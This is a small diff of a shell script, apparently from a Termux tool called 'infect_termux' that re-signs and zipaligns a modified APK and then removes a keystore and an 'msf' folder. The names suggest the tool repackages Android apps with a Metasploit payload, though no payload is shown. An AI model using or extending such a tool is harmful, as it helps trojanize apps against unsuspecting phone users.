@@ -88,7 +88,7 @@ banner
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore org1.keystore org1-modified.apk org1
 sleep 1
 echo -e -n $negro"\n[ + ] FIRMANDO TU APP \n"
-zipalign -v 4 /data/data/com.termux/files/home/infect_termux/org1-modified.apk $out
+zipalign -v 4 org1-modified.apk $out
 sleep 1
 rm -rf /data/data/com.termux/files/home/infect_termux/org1.keystore
 rm -rf /data/data/com.termux/files/home/infect_termux/msf
